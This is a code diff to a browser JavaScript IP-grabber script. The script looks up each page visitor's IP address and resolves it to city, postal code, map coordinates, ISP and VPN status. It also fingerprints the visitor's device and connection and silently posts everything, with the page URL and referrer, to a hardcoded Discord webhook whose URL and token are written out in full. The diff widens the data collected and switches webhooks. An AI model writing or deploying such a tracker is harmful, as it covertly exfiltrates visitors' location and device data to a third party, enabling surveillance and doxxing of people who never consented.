@@ -1,15 +1,19 @@
 function getDeviceInfo() {
     const userAgent = navigator.userAgent;
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
+    const screen = `${window.screen.width}x${window.screen.height}`;
     const colorDepth = window.screen.colorDepth;
-    const devicePixelRatio = window.devicePixelRatio;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const languages = navigator.languages;
+    const languages = navigator.languages.join(', ');
     const cookiesEnabled = navigator.cookieEnabled;
-    const doNotTrack = navigator.doNotTrack;
+    const doNotTrack = navigator.doNotTrack || 'Not specified';
     const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
     const deviceMemory = navigator.deviceMemory || 'unknown';
+    const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not supported';
+    const connection = navigator.connection ? {
+        type: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+    } : null;
 
     let deviceType = 'Desktop';
     if (/Mobi|Android/i.test(userAgent)) deviceType = 'Mobile';
@@ -39,26 +43,47 @@ function getDeviceInfo() {
         deviceType,
         os,
         browser,
-        screenWidth,
-        screenHeight,
+        screen,
         colorDepth,
-        devicePixelRatio,
         timezone,
         languages,
         cookiesEnabled,
         doNotTrack,
         hardwareConcurrency,
-        deviceMemory
+        deviceMemory,
+        touchSupport,
+        connection
     };
 }
 
-function getPageInfo() {
-    return {
-        url: window.location.href,
-        referrer: document.referrer || 'No referrer',
-        pageTitle: document.title,
-        timestamp: new Date().toISOString()
-    };
+function getLocationDetails(ipData) {
+    const continent = ipData.continent || 'Unknown';
+    const continentEmoji = {
+        'Asia': '🌏',
+        'Europe': '🌍',
+        'Africa': '🌍',
+        'North America': '🌎',
+        'South America': '🌎',
+        'Oceania': '🌏',
+        'Antarctica': '🏔️'
+    }[continent] || '🗺️';
+
+    return `
+🌐 **Continent**: ${continent} ${continentEmoji}
+🏙️ **City**: ${ipData.city || 'Unknown'}
+🏛️ **Region**: ${ipData.region || 'Unknown'} (${ipData.region_code || 'N/A'})
+🇺🇳 **Country**: ${ipData.country} (${ipData.country_code || 'N/A'})
+📍 **Coordinates**: [${ipData.latitude}, ${ipData.longitude}]
+🗺️ **Map**: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
+🏢 **Postal Code**: ${ipData.postal || 'Unknown'}
+🕍 **Timezone**: ${ipData.timezone?.id || 'Unknown'} (UTC${ipData.timezone?.utc || 'N/A'})
+📡 **ISP**: ${ipData.isp} (AS${ipData.asn || 'N/A'})
+🏢 **Organization**: ${ipData.org || 'Unknown'}
+💼 **ASN Info**: ${ipData.asn_name || 'Unknown'}
+🌐 **Proxy/VPN**: ${ipData.proxy ? 'Yes' : 'No'} (${ipData.proxy_type || 'None'})
+📶 **Mobile**: ${ipData.mobile ? 'Yes' : 'No'}
+🏠 **Hosting**: ${ipData.hosting ? 'Yes' : 'No'}
+    `;
 }
 
 function sendVisitorInfo() {
@@ -66,51 +91,55 @@ function sendVisitorInfo() {
         .then(response => response.json())
         .then(data => {
             const userIP = data.ip;
-            fetch(`https://ipwho.is/${userIP}`)
+            fetch(`https://ipwho.is/${userIP}?fields=continent,country,country_code,region,region_code,city,postal,latitude,longitude,timezone,isp,org,asn,asn_name,proxy,proxy_type,mobile,hosting`)
                 .then(response => response.json())
                 .then(ipData => {
                     const deviceInfo = getDeviceInfo();
-                    const pageInfo = getPageInfo();
+                    const locationDetails = getLocationDetails(ipData);
+                    const connectionInfo = deviceInfo.connection ? `
+📶 **Connection Type**: ${deviceInfo.connection.type}
+⬇️ **Downlink**: ${deviceInfo.connection.downlink} Mbps
+⏱️ **RTT**: ${deviceInfo.connection.rtt} ms
+                    ` : '';
 
                     const message = `📡 **New Visitor Info** 📡\n\n` +
                         `🆔 **IP Address**: ${ipData.ip}\n` +
-                        `🌍 **Location**: ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
-                        `📍 **Coordinates**: Lat ${ipData.latitude}, Lon ${ipData.longitude}\n` +
-                        `📡 **ISP**: ${ipData.isp} (AS${ipData.asn})\n` +
-                        `🏠 **Org**: ${ipData.org}\n` +
-                        `📱 **Device**: ${deviceInfo.deviceType}\n` +
+                        locationDetails +
+                        `\n📱 **Device Type**: ${deviceInfo.deviceType}\n` +
                         `🖥 **OS**: ${deviceInfo.os}\n` +
                         `🌐 **Browser**: ${deviceInfo.browser}\n` +
-                        `🖥 **Screen**: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.colorDepth}bit, ${deviceInfo.devicePixelRatio}x)\n` +
+                        `🖥 **Screen**: ${deviceInfo.screen} (${deviceInfo.colorDepth}bit)\n` +
                         `⏰ **Timezone**: ${deviceInfo.timezone}\n` +
-                        `🗣 **Languages**: ${deviceInfo.languages.join(', ')}\n` +
+                        `🗣 **Languages**: ${deviceInfo.languages}\n` +
                         `🍪 **Cookies**: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
-                        `🚫 **DNT**: ${deviceInfo.doNotTrack || 'Not specified'}\n` +
+                        `🚫 **DNT**: ${deviceInfo.doNotTrack}\n` +
                         `💻 **CPU Cores**: ${deviceInfo.hardwareConcurrency}\n` +
                         `🧠 **Device Memory**: ${deviceInfo.deviceMemory}GB\n` +
-                        `🔗 **Page URL**: ${pageInfo.url}\n` +
-                        `📌 **Referrer**: ${pageInfo.referrer}\n` +
-                        `🕒 **Time**: ${pageInfo.timestamp}`;
+                        `🖐 **Touch Support**: ${deviceInfo.touchSupport}\n` +
+                        connectionInfo +
+                        `\n🔗 **Page URL**: ${window.location.href}\n` +
+                        `📌 **Referrer**: ${document.referrer || 'No referrer'}\n` +
+                        `🕒 **Timestamp**: ${new Date().toISOString()}`;
 
-                    fetch("https://discord.com/api/webhooks/1374747072141721661/fQ3Cs2brVlQYZLEtbeWgRywFoL2rRjlGxjkTR5KzbEk937AQr0U_1YuX3JPRQXq080Yn", {
+                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ content: message })
                     });
                 })
                 .catch(error => {
-                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
+                    fetch("YOUR_ERROR_WEBHOOK_URL", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: "Error fetching IP details: " + error })
+                        body: JSON.stringify({ content: `Error fetching IP details: ${error}` })
                     });
                 });
         })
         .catch(error => {
-            fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
+            fetch("YOUR_ERROR_WEBHOOK_URL", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "Error fetching IP: " + error })
+                body: JSON.stringify({ content: `Error fetching IP: ${error}` })
             });
         });
 }
